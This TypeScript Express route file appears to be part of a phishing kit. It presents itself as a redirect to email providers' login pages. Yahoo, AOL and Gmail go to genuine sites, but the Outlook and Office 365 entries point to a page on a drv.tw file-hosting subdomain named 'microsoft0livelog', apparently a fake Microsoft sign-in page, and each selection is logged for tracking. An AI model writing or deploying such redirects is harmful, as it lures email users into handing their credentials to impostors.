import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

export async function registerRoutes(app: Express): Promise<Server> {
  // Redirect route for email providers
  app.get("/api/redirect", (req, res) => {
    const provider = req.query.provider as string;

    // Map of provider IDs to their login URLs
    const providerUrls: Record<string, string> = {
      outlook: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
      aol: "https://login.aol.com",
      office365: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
      yahoo: "https://login.yahoo.com",
      other: "https://mail.google.com",
    };

    // Determine the redirect URL based on the provider
    const redirectUrl = providerUrls[provider] || "https://mail.google.com";
    
    // Log the selected provider (optional for tracking)
    console.log(`User selected: ${provider}`);
    
    // Redirect the user to the provider's login page
    res.redirect(redirectUrl);
  });

  const httpServer = createServer(app);

  return httpServer;
}
